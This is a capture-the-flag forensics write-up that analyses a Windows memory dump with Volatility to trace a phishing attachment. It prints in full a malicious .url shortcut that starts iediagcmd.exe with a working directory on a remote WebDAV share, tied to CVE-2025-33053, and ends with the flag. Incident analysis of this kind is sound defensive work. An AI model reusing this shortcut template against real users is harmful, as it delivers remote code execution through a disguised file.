# Ophelia's Truth 1

## Solution:

- At first I was a bit confused about why the  `.raw` file was so large (7.5 gb)
- `exiftool` and `file` commands mentioned it being a `.elf`
- But given the desc, I thought it might be a memory dump so I checked using volatility and confirmed it
```
python3 vol.py -f ophelia.raw windows.info
```
- We know the vector was an attachment related to a "DNA report". Next I scanned for files that might match this description.

```
python vol.py -f ophelia.raw windows.filescan.FileScan | grep dna
```
```
0xc50d0c562a90.0\Users\Igor\Documents\Important Links\dna_analysis_portal.url
```
The file `dna_analysis_portal.url` located in "Important Links" seems to be our culprit.

- I used the virtual address `0xc50d0c562a90` to dump the file.

```
python vol.py -f ophelia.raw windows.dumpfiles.DumpFiles --virtaddr=0xc50d0c562a90
```

- Opening the file revealed that this wasn't a normal web shortcut. 

```ini
[InternetShortcut]
URL=C:\Program Files\Internet Explorer\iediagcmd.exe
WorkingDirectory=\\10.72.5.205\webdav\\
ShowCommand=7
IconIndex=13
IconFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
Modified=20F06BA06D07BD014D
```

- the url points to a local system executable `iediagcmd.exe`, not a website
- the working directory is set to a remote UNC path on an external IP `10.72.5.205` via WebDAV
- Searching for vulnerabilities involving `iediagcmd.exe` and remote working directories points directly to `CVE-2025-33053`

- We have all the required pieces:

  - Filename: `dna_analysis_portal.url`
  - IP: `10.72.5.205`
  - CVE: `CVE-2025-33053`

## Flag: 
```
nite{dna_analysis_portal.url_10.72.5.205_CVE-2025-33053}
```

